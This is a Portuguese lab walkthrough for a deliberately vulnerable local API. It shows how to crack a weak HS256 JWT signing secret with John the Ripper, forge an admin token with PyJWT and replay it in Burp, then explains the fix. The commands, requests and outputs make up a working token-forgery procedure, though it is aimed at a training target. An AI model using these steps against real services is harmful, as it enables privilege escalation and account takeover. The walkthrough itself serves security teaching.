# Walkthrough — jwt-weak-secret

Você vai pegar um JWT legítimo — uma signature HS256 de verdade, verificada corretamente pelo servidor — e **quebrar o secret que a assina**, porque o dev escolheu uma palavra de dicionário. Com o secret na mão, você forja um token `role: admin` que o servidor aceita como genuíno: não porque a verificação de assinatura está quebrada (ela funciona), mas porque agora você tem a chave. A fechadura tranca; a chave estava num post-it.

Este é o irmão do [`jwt-none-alg`](../jwt-none-alg/). Lá a fechadura não trancava — o servidor aceitava `alg:none` e pulava a verificação. Aqui a verificação roda, correta, e você a derrota *refazendo* uma signature válida com o secret roubado.

## 1. Contexto

Uma API pequena com auth por JWT. Três endpoints:

- `POST /login` — devolve um JWT assinado em HS256, carregando `{"sub": "alice", "role": "user"}`. Sem senha.
- `GET /api/profile` — qualquer token válido; ecoa suas claims. Seu baseline, e onde você captura o JWT.
- `GET /admin/users` — exige `role: admin`. Seu token `user` leva `403`; um token `admin` forjado leva `200`.

O servidor verifica todo token sob `algorithms=["HS256"]` — uma signature adulterada leva `401`, e `alg:none` (o truque do `jwt-none-alg`) leva `401` também. Este átomo é **A02 — Cryptographic Failures**: o esquema de assinatura é sólido e verificado corretamente; a única fraqueza é o *valor* do secret de assinatura.

A trilha é **Burp** (capturar o token, replay da forja) mais um **terminal** (quebrar o secret com o John the Ripper, forjar o token novo). Não há browser: quebrar um secret é algo que o Burp não faz, então — exatamente como um browser executa JavaScript num bug client-side — a ferramenta que faz essa parte do trabalho entra na trilha principal. Os tokens abaixo são de uma sessão real; como estas claims não carregam timestamps, o token HS256 é determinístico — logue como `alice` e você recebe os mesmos bytes.

## 2. Ache o bug

Abra [`vulnerable/app.py`](./vulnerable/app.py). O helper de decode está correto, de manual:

```python
def decode(token):
    return jwt.decode(token, SECRET, algorithms=["HS256"])
```

Esta é a forma *fixed* do `jwt-none-alg`: uma allowlist positiva `algorithms=["HS256"]`, sem branch no header, sem escape de `alg:none`. O tratamento do algoritmo está certo. O bug não está nesta linha.

Agora olhe uma linha acima, a constante com que ele verifica:

```python
SECRET = "changeme123"  # VULNERABLE: weak, guessable, sits in any password wordlist
```

É essa a vulnerabilidade inteira. A pergunta de auditoria não é "ele verifica?" — verifica. É **"esse secret é forte?"** — e `changeme123` é uma palavra de dicionário. A segurança de todo token repousa num valor que um atacante consegue adivinhar. Guarde isso pro diff: o fix não vai tocar uma linha de lógica, vai mudar esta constante.

O PyJWT até te avisa. Como `changeme123` tem 11 bytes, todo sign e verify imprime `InsecureKeyLengthWarning: The HMAC key is 11 bytes long, which is below the minimum recommended length of 32 bytes for SHA256` no log do servidor. A lib está te dizendo que a chave é fraca demais — ela só não recusa.

## 3. Como o JWT é assinado

Um JWT são três segmentos base64url: `header.payload.signature`. A signature é `HMAC-SHA256(header + "." + payload, SECRET)` — um hash com chave sobre os dois primeiros segmentos. O servidor recomputa esse HMAC com o seu `SECRET` e rejeita o token se não bater. (Pra a anatomia byte a byte completa, veja o walkthrough do `jwt-none-alg`, §2.)

Duas consequências:

- Pra **forjar** um token que o servidor aceite, você precisa saber o `SECRET`. Não há como contornar o HMAC — ele é sólido.
- Mas HMAC-SHA256 sobre uma chave *adivinhável* é um alvo de brute force: pra cada palavra candidata, recompute o HMAC e confira contra a signature capturada. É exatamente o que um cracker faz.

`alg:none` não é opção aqui — o servidor fixa `algorithms=["HS256"]`, então um token sem assinatura é rejeitado (você confirma isso na §9). O único caminho de entrada é a chave.

## 4. Baseline — a API funcionando (Repeater)

Aponte o Burp pra `127.0.0.1:8013` e trabalhe no Repeater. Logue como alice:

```
POST /login HTTP/1.1
Host: 127.0.0.1:8013
Content-Type: application/json

{"user": "alice"}
```

Response — `200`, seu token:

```json
{"token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhbGljZSIsInJvbGUiOiJ1c2VyIn0.6BhkpiQ83X2YaEIV4WJsi1f1OyBlnHulxD3BchcVmSQ"}
```

Confirme que funciona:

```
GET /api/profile HTTP/1.1
Host: 127.0.0.1:8013
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhbGljZSIsInJvbGUiOiJ1c2VyIn0.6BhkpiQ83X2YaEIV4WJsi1f1OyBlnHulxD3BchcVmSQ
```

Response — `200`: `{"role":"user","sub":"alice"}`. Agora tente o endpoint admin com o mesmo token:

```
GET /admin/users HTTP/1.1
Host: 127.0.0.1:8013
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhbGljZSIsInJvbGUiOiJ1c2VyIn0.6BhkpiQ83X2YaEIV4WJsi1f1OyBlnHulxD3BchcVmSQ
```

Response — `403`. Você está autenticado, mas o `role` é `user`. Esse é o baseline legítimo: o gate de role funciona.

## 5. Passo 1 — Capture o JWT

Você já tem ele — é o token do body da response do `/login`, e ele viaja em toda request ao `/api/profile` no header `Authorization`. Copie ele (no Burp, selecione o valor do header, ou pegue da response do login). Esse token é o que você vai quebrar.

Decodado (base64url — qualquer um com o token consegue ler), o header e o payload são:

```
header  {"alg":"HS256","typ":"JWT"}
payload {"sub":"alice","role":"user"}
```

O terceiro segmento é a signature HMAC. Você não consegue ler a chave dele — mas consegue adivinhar a chave e conferir.

## 6. Passo 2 — Quebre o secret de assinatura (terminal)

Este passo é fora do Burp e fora do container — um cracker no seu próprio terminal. Salve o token capturado num arquivo:

```bash
echo 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhbGljZSIsInJvbGUiOiJ1c2VyIn0.6BhkpiQ83X2YaEIV4WJsi1f1OyBlnHulxD3BchcVmSQ' > jwt.txt
```

Rode o John the Ripper contra a wordlist que vem com este átomo. O john jumbo reconhece um JWT cru e o carrega no formato `HMAC-SHA256` automaticamente:

```bash
john --wordlist=wordlist-sample.txt jwt.txt
```

> Você precisa do John the Ripper **jumbo** (o build da comunidade em [openwall/john](https://github.com/openwall/john), que vem no Kali e na maioria das distros de pentest). O build core não tem o formato `HMAC-SHA256` e não carrega um JWT.

Output real:

```
Using default input encoding: UTF-8
Loaded 1 password hash (HMAC-SHA256 [password is key, SHA256 256/256 AVX2 8x])
Will run 12 OpenMP threads
Press Ctrl-C to abort, or send SIGUSR1 to john process for status
changeme123      (?)
1g 0:00:00:00 DONE (2026-07-17 18:59) 100.0g/s 100000p/s 100000c/s 100000C/s 123456..panda
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

`john --show jwt.txt` confirma:

```
?:changeme123

1 password hash cracked, 0 left
```

O secret é `changeme123`. (Número de threads, timestamp e taxa dependem da sua máquina.) Contra esta lista-amostra de ~1000 palavras o john termina em bem menos de um segundo — o secret fica perto do fim, por volta da linha 980, então ele passa pelos chutes comuns primeiro. Num engajamento real você apontaria o john pra a lista canônica grande, a **rockyou** — no Kali em `/usr/share/wordlists/rockyou.txt` (gzipada), ou junto com a distribuição do próprio John the Ripper — onde você veria a linha de status moer milhões de candidatos. O `changeme123` está na rockyou também (linha 361.429), então o mesmo run quebra ele lá; a lista-amostra é só zero-atrito pro lab. (Não dê `wget` num mirror aleatório de rockyou — use a cópia que sua distro traz.)

## 7. Passo 3 — Forje um token admin

Com o secret, você refaz uma signature você mesmo — uma genuína. Um one-liner com a mesma biblioteca JWT que a app usa:

```bash
python3 -c "import jwt; print(jwt.encode({'sub': 'alice', 'role': 'admin'}, 'changeme123', algorithm='HS256'))"
```

Output — um token admin válido:

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhbGljZSIsInJvbGUiOiJhZG1pbiJ9.BalXD3EsGbrToDQm5zMCKrIABJPI52WYVtsRXmO-YNU
```

Este é o inverso do `jwt-none-alg`. Lá você *arrancava* a signature (`alg:none`, terceiro segmento vazio). Aqui você *produz* uma signature HMAC de verdade com o secret roubado — matematicamente idêntica a uma que o servidor emitiria, porque usa a mesma chave. Decodado, o payload agora é `{"sub":"alice","role":"admin"}`.

## 8. Passo 4 — Replay do token forjado (Burp)

De volta ao Repeater, mande o token forjado pro endpoint admin:

```
GET /admin/users HTTP/1.1
Host: 127.0.0.1:8013
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhbGljZSIsInJvbGUiOiJhZG1pbiJ9.BalXD3EsGbrToDQm5zMCKrIABJPI52WYVtsRXmO-YNU
```

Response — `200`, o dado restrito a admin:

```json
[{"role":"user","user":"alice"},{"role":"user","user":"bob"},{"role":"admin","user":"carol"}]
```

Escalação vertical confirmada. Você não contornou a verificação de assinatura — você a **satisfez**, com a chave que quebrou. O servidor não consegue distinguir sua forja de um token que ele mesmo emitiu, porque são a mesma coisa: bytes assinados com `changeme123`.

## 9. O que a vuln NÃO é

O exploit pode te empurrar pra a conclusão errada. Mate três delas — todas no Repeater.

**Não é falha de verificação.** Pegue o token admin forjado e troque um caractere da signature, ou assine com a chave errada:

```bash
python3 -c "import jwt; print(jwt.encode({'sub':'alice','role':'admin'}, 'wrongkey', algorithm='HS256'))"
```

Mande esse → **`401`**. O servidor confere o HMAC e rejeita qualquer coisa não assinada com o secret certo. A verificação funciona perfeitamente; só uma signature feita com a chave *correta* passa.

**Não é `alg:none` — isto não é o `jwt-none-alg`.** Monte a forja clássica sem assinatura e mande:

```
Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhbGljZSIsInJvbGUiOiJhZG1pbiJ9.
```

Response — **`401`**. A allowlist `algorithms=["HS256"]` rejeita; esse bug está fechado aqui. (Sem token, ou um Bearer aleatório, também dá `401`.)

**Não é o algoritmo.** HMAC-SHA256 não foi quebrado — ele fez o trabalho dele. Você não quebrou a matemática; você *adivinhou a chave*.

Uma causa raiz sob as três: o secret não tinha entropia. Só o token assinado com a chave quebrada-mas-correta passa.

Esse é o par com o `jwt-none-alg`, tornado concreto:

| | `jwt-none-alg` (o irmão) | `jwt-weak-secret` (aqui) |
|---|---|---|
| A fechadura | não trancava (`alg:none`, verificação pulada) | tranca, corretamente (`algorithms=["HS256"]`) |
| O ataque à signature | você a **arranca** | você a **refaz**, genuína, com a chave quebrada |
| Onde mora a falha | o código (um branch guiado pelo header) | um valor (a constante `SECRET`) |

O `jwt-none-alg` disse *"looks-like-crypto is not is-crypto"*. Este átomo afia: crypto que roda de verdade ainda não é um boundary se a chave é adivinhável. **Assinado não é seguro — uma signature é tão forte quanto seu secret.**

## 10. Impacto

Escalação vertical de privilégio. Com o secret você forja **qualquer** token — qualquer `sub`, qualquer `role`, qualquer claim em que a app confia. Você não só leu o dado de outro usuário do mesmo nível (essa é a escalação horizontal que os átomos de IDOR/BOLA ensinam); você *virou administrador*, e poderia virar qualquer um com qualquer privilégio. Na prática você é dono da autenticação da app: você é quem disser que é. **Não é RCE** — sem execução de código — mas pra um sistema de auth é quase total: toda decisão de identidade e role a jusante deste token agora se curva a você.

## 11. Por que o fix funciona

Rode a cadeia contra a API fixed na porta **8113** (veja o [`DIFF.pt-BR.md`](./DIFF.pt-BR.md)). Ela é byte-idêntica exceto pela constante `SECRET`, agora um valor CSPRNG de 43 caracteres:

- **Logue na 8113 e quebre esse token** com o mesmo `john --wordlist=wordlist-sample.txt jwt.txt` → **nenhum hit** (`0 password hashes cracked, 1 left`). O secret forte não está na lista-amostra — nem na rockyou, nem em wordlist nenhuma: brute-forçar 32 bytes aleatórios é inviável.
- **Replay do token admin que você forjou contra a app vulnerable** (assinado com `changeme123`) → **`401`**. A signature não bate mais, porque a app fixed verifica com uma chave diferente.
- Todo o resto é igual — mesmos endpoints, mesmo `algorithms=["HS256"]`; `alg:none` e sem-token ainda `401`, e um token `user` legítimo ainda `403` no `/admin/users`.

O fix não foi uma linha de lógica. Foi `SECRET = "changeme123"` → `SECRET = "<43 chars CSPRNG>"`. A segurança morava inteiramente no valor do secret. Veja o [`DIFF.pt-BR.md`](./DIFF.pt-BR.md) pra por que isso faz deste o primeiro fix do repo que muda um *valor*, não código.
